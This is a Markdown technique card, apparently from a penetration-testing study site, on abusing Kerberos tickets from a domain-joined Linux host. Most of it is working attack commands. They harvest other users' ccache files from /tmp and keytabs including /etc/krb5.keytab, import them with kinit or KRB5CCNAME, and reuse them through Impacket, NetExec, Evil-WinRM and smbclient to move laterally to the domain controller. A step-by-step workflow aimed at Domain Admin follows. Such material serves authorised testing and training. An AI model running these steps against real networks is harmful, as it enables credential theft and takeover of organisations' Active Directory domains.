---
tool: Pass the Ticket (Linux)
slug: linux-ticket-abuse
kind: technique
stages: [post-compromise]
targets: [linux, windows]
category: Abusing Kerberos tickets from a domain-joined Linux host
platforms: [linux]
services: [kerberos]
ports: [88]
tags: [active directory, kerberos, pass-the-ticket, ccache, keytab, lateral movement]
attack: [T1550.003, T1558, T1003.007]
summary: Domain-joined Linux boxes authenticate to Active Directory with Kerberos, so a foothold on one often hands you other users' tickets. Harvest the ccache files in /tmp and the keytab files on disk, import them with kinit, and reuse them with -k against the domain — frequently a straight line from a low-priv shell to a Domain Admin on the DC.
references:
  - HackTricks — Pass the Ticket | https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket
  - MIT Kerberos — credential cache | https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html
---

## When to reach for it

You have a shell on a Linux host and suspect it is joined to, or authenticates against, Active Directory. Kerberos material left on the box — live ccache files in `/tmp`, keytab files used by cron jobs and services, the machine's own `/etc/krb5.keytab` — lets you act as whoever owns it, without ever knowing a password. Root on the box means every user's tickets are yours.

## Confirm the host talks to Active Directory

```bash
realm list                               # domain, realm, permitted logins/groups
ps -ef | grep -iE 'sssd|winbind'         # the integration daemons, if realm is absent
cat /etc/krb5.conf                        # default_realm and the KDC (the DC)
```

## Find tickets: ccache and keytab files

```bash
env | grep -i KRB5CCNAME                  # path to the current session's ccache
klist                                      # whose ticket is loaded, and its expiry
ls -la /tmp/krb5cc_*                       # other users' caches (readable as root)
find / -name '*keytab*' -ls 2>/dev/null   # keytabs on disk (service/cron creds)
klist -k -t /etc/krb5.keytab              # principals inside a keytab
```

## Import a ticket and reuse it

```bash
# From a keytab: request a TGT as that principal (case matters — lower user, UPPER realm)
kinit svc_user@DOMAIN -k -t /opt/svc_user.keytab
# From a stolen ccache: just point the variable at it
export KRB5CCNAME=/tmp/krb5cc_1234_abcd
klist                                      # confirm the principal and that it is valid
# Use it against the domain with -k / --use-kcache
smbclient //TARGET/share -k -c ls
netexec smb TARGET --use-kcache
impacket-wmiexec TARGET -k -no-pass
evil-winrm -i TARGET -r DOMAIN
```

## Convert between Linux and Windows formats

```bash
# ccache (Linux) <-> kirbi (Windows, for Rubeus ptt)
impacket-ticketConverter krb5cc_1234_abcd ticket.kirbi
impacket-ticketConverter ticket.kirbi krb5cc_out
```

## Workflow

1. Confirm the host is domain-joined (`realm list`, or sssd/winbind running).
2. Before overwriting anything, save the current `KRB5CCNAME` cache so you can restore your own session.
3. List `/tmp` for other users' `krb5cc_*` caches and `find` the keytabs; `klist` each to see who it belongs to and whether it is still valid.
4. Import the most privileged live ticket (`export KRB5CCNAME=...`) or `kinit` from a keytab.
5. Pivot to the DC or a target host with a `-k`-aware tool (Impacket, NetExec, Evil-WinRM, smbclient).
6. For keytabs, pull the hashes out with [KeyTabExtract](/cpts/#tool-keytabextract) to pass or crack; as root, sweep everything with [Linikatz](/cpts/#tool-linikatz).

## Notes

ccache files are time-limited — a ticket past its "Expires" time is dead, so work quickly and check `klist` first. Attacking from a Linux box that is *not* domain-joined (your own attack host) works too, but you must reach the KDC: proxy through the foothold with [Chisel](/cpts/#tool-chisel) and [Proxychains](/cpts/#tool-proxychains), hardcode the DC and realm in `/etc/hosts`, and set `default_realm`/`kdc` in `/etc/krb5.conf`. Some SSSD setups prefix the variable as `KRB5CCNAME=FILE:/path` — drop the `FILE:` for Impacket. Keytabs are portable: the machine account's `/etc/krb5.keytab` impersonates `HOSTNAME$` across the domain. For roasting and the Windows side of ticket abuse, see the [Kerberos attacks note](/cpts/#tool-kerberos-attacks).
